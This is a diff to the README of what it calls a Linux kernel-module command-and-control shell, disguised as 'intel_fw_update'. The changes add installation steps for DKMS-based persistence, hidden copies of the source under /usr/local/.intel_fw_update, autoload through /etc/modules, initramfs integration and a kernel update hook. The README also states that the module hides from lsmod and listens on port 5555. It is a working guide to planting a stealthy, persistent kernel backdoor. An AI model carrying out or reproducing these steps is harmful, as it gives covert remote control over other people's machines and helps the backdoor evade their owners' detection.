@@ -27,19 +27,19 @@ This is a Linux kernel module-based command and control shell that:
 **Ubuntu/Debian:**
 ```bash
 sudo apt-get update
-sudo apt-get install build-essential linux-headers-$(uname -r) wget
+sudo apt-get install build-essential linux-headers-$(uname -r) dkms wget make
 ```
 
 **CentOS/RHEL:**
 ```bash
 sudo yum groupinstall "Development Tools"
-sudo yum install kernel-devel-$(uname -r)
+sudo yum install kernel-devel-$(uname -r) dkms make
 ```
 
 **Fedora:**
 ```bash
 sudo dnf groupinstall "Development Tools"
-sudo dnf install kernel-devel-$(uname -r)
+sudo dnf install kernel-devel-$(uname -r) dkms make
 ```
 
 ---
@@ -54,10 +54,12 @@ ls /lib/modules/$(uname -r)/build
 
 # If missing, install them:
 sudo apt-get update
-sudo apt-get install linux-headers-$(uname -r) build-essential
+sudo apt-get install linux-headers-$(uname -r) build-essential dkms
 ```
 
 ### Build the Module
+
+**Note:** Manual compilation is not required - the `install.sh` script uses DKMS for automatic building. However, for manual testing:
 
 ```bash
 cd linux-(tested)
@@ -73,49 +75,55 @@ file intel_fw_update.ko
 make clean
 ```
 
-The provided Makefile handles all compilation details. It will create `intel_fw_update.ko` in the current directory, which is required by the `install.sh` script.
+The provided Makefile handles all compilation details. DKMS will manage builds automatically for kernel updates.
 
 ---
 
 ## INSTALLATION
 
-### Quick Installation (Automated)
+### Quick Installation (Automated with DKMS)
 
-The easiest way is to use the provided install script:
+The easiest way is to use the provided install script with DKMS for automatic kernel compatibility:
 
 ```bash
 cd linux-(tested)
 
-# Compile the module
-make
-
-# Run the installer (handles persistence, kernel hooks, etc.)
+# Run the installer (handles DKMS setup, persistence, etc.)
 sudo ./install.sh
 ```
 
 The script will:
-- ✓ Compile the kernel module (if not already compiled)
-- ✓ Create hidden module directory
-- ✓ Copy module to kernel modules directory
+- ✓ Install DKMS and build tools if needed
+- ✓ Copy source to `/usr/local/.intel_fw_update/src/` (hidden)
+- ✓ Set up DKMS tree in `/usr/src/intel_fw_update-1.1/`
+- ✓ Add module to DKMS
+- ✓ Build and install for current kernel
 - ✓ Add to `/etc/modules` for autoload
 - ✓ Update initramfs for early boot loading
-- ✓ Create kernel update hook (survives kernel upgrades)
+- ✓ Create kernel update hook as backup
 - ✓ Update module dependencies with depmod
 - ✓ Load the module immediately
+
+**DKMS Benefits:**
+- Automatically rebuilds for new kernel versions
+- No manual recompilation needed after updates
+- Handles kernel ABI changes seamlessly
 
 ### Verify Installation
 
 After running the install script, verify it's working:
 
 ```bash
-# Check if module is loaded
-sudo lsmod | grep intel_fw_update
+# Check if module is loaded (note: it hides from lsmod)
+sudo dkms status intel_fw_update
 
 # Check listening port
 sudo netstat -ulnp | grep 5555
 
-# View hidden module location
-ls -la /usr/local/.intel_fw_update/
+# Check DKMS source
+ls -la /usr/src/intel_fw_update-1.1/
+# Hidden backup
+ls -la /usr/local/.intel_fw_update/src/
 
 # Check module installation directory
 ls -la /lib/modules/$(uname -r)/updates/firmware-intel/
@@ -128,63 +136,88 @@ ls -la /etc/kernel/postinst.d/ | grep intel
 
 ## PERSISTENT INSTALLATION
 
-The `install.sh` script handles all persistence setup automatically. Simply run:
+The `install.sh` script handles all persistence setup automatically using DKMS. Simply run:
 
 ```bash
 cd linux-(tested)
-./install.sh
+sudo ./install.sh
 ```
 
 ### What the Install Script Does
 
 The script sets up **multiple persistence mechanisms** to ensure the module survives reboots and kernel updates:
 
-**1. Hidden Module Storage**
-- Copies compiled `.ko` to `/usr/local/.intel_fw_update/` (restricted permissions: 700)
-- Hidden from normal directory listings
-- Survives removal of kernel modules
+**1. DKMS Integration** ⭐ (Primary)
+- Registers module with DKMS for automatic rebuilding
+- Source stored in `/usr/src/intel_fw_update-1.1/` (standard DKMS location)
+- Backup copy in `/usr/local/.intel_fw_update/src/` (hidden)
+- Builds and installs for current and future kernels
+- **Automatically handles kernel updates** - no manual intervention needed
 
-**2. Kernel Modules Directory**
-- Installs to `/lib/modules/$(uname -r)/updates/firmware-intel/`
-- Loaded automatically by kernel at boot time
-
-**3. `/etc/modules` Autoload**
+**2. `/etc/modules` Autoload**
 - Adds `intel_fw_update` to `/etc/modules` for boot-time loading
 - Module loads before most network services start
 
-**4. Initramfs Integration**
+**3. Initramfs Integration**
 - Updates initial RAM filesystem (`update-initramfs`)
 - Module available early in boot process
 
-**5. Kernel Update Hook** ⭐ (Most Robust)
+**4. Kernel Update Hook** (Backup)
 - Creates `/etc/kernel/postinst.d/install_intel_fw_update_module` hook script
-- **Automatically reinstalls module after kernel updates**
+- Provides additional persistence if DKMS fails
 - Survives `apt full-upgrade` and kernel patches
-- Module persists across major kernel version changes
 
-**6. Depmod Integration**
+**5. Depmod Integration**
 - Updates module dependencies with `depmod`
 - Kernel automatically detects and loads module
 
-### Manual Setup (If Needed)
+### DKMS Management
 
-If you need to run parts manually:
+After installation, you can manage the module with DKMS:
 
 ```bash
-# Build module
-make
+# Check status
+sudo dkms status intel_fw_update
 
-# Then install everything with the script
-sudo ./install.sh
+# Rebuild for current kernel
+sudo dkms build intel_fw_update/1.1
 
-# Or install just the compiled module manually
-sudo insmod intel_fw_update.ko
+# Reinstall
+sudo dkms install intel_fw_update/1.1
+
+# Remove from DKMS
+sudo dkms remove intel_fw_update/1.1 --all
+```
+
+### Manual Setup (If Needed)
+
+If you need to run parts manually (not recommended - use the script):
+
+```bash
+# Install DKMS
+sudo apt install dkms
+
+# Copy source to both locations
+sudo mkdir -p /usr/src/intel_fw_update-1.1
+sudo cp Makefile intel_fw_update.c dkms.conf /usr/src/intel_fw_update-1.1/
+sudo mkdir -p /usr/local/.intel_fw_update/src
+sudo cp Makefile intel_fw_update.c /usr/local/.intel_fw_update/src/
+
+# Add to DKMS
+sudo dkms add intel_fw_update/1.1
+
+# Build and install
+sudo dkms build intel_fw_update/1.1
+sudo dkms install intel_fw_update/1.1
 
 # Add to autoload
 echo "intel_fw_update" | sudo tee -a /etc/modules
 
 # Update initramfs
 sudo update-initramfs -u
+
+# Load module
+sudo modprobe intel_fw_update
 ```
 
 ---
